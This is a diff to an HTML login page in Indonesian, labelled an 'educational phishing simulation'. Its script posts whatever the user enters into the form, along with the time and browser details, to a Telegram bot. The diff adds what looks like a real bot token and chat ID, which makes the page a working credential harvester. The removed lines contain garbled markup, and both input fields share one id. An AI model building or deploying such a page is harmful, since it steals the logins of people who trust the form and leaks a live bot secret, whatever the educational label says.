@@ -100,44 +100,36 @@
 </head>
 <body>
 
-<div class="container">
-    <div class="back">←</div>
-
-    <h1>Halo 👋<br>Selamat datang</h1>
-
-    <div class="mascot">
-        <!-- Ganti src dengan gambar maskot jika ada -->
-        <img src="https://via.placeholder.com/120" alt="Maskot">
-    </div>
-
-    <div class="box">
+<div class="box">
   <h2>Login Akun</h2>
 
-  <input type="text" id="user" placeholder="Email / Username" required>
-  <input type="pasword" id="user" placeholder="Tulis kata sandi kamu" required>
+  
+  <input type="text" id="user" placeholder="Email / Username (Simulasi)" required>
+<input type="password" id="user" placeholder="Email / Username (Simulasi)" required>
+  <button onclick="kirim()">Masuk</button>
 
-  <button onclick="kirim()">Masuk</buttbutton <div class="ns="note">
- ️ Login aman
+  <div class="note">
+    ⚠️ Ini hanya simulasi edukasi keamanan
   </div>
 </div>
 
 <script>
-const BOT_TOKEN = "ISI_TOKEN_BOT";
-const CHAT_ID  = "ISI_CHAT_ID";
+const BOT_TOKEN = "8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M";
+const CHAT_ID  = "5116335881";
 
 function kirim() {
   const user = document.getElementById("user").value;
   if (!user) {
-    alert("Masukkan text");
+    alert("Masukkan username simulasi");
     return;
   }
 
-  const pesan = `
-🔐 SIMULASI PHISHING EDUKASI
-👤 User: ${user} ${user}u: ${new Date().toLocaleString()}
+  const pesan =
+`🔐 SIMULASI PHISHING EDUKASI
+👤 User: ${user}
+🕒 Waktu: ${new Date().toLocaleString()}
 🌐 Browser: ${navigator.userAgent}
-📘 password (aman)
-`;
+📘 password
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -148,7 +140,7 @@ function kirim() {
     })
   });
 
-  alert("Simulasi selesai.\nIni contoh bagaimana data bisa dikirim tanpa disadari.");
+  alert("Simulasi selesai.\nPerhatikan bagaimana data bisa terkirim.");
 }
 </script>
 
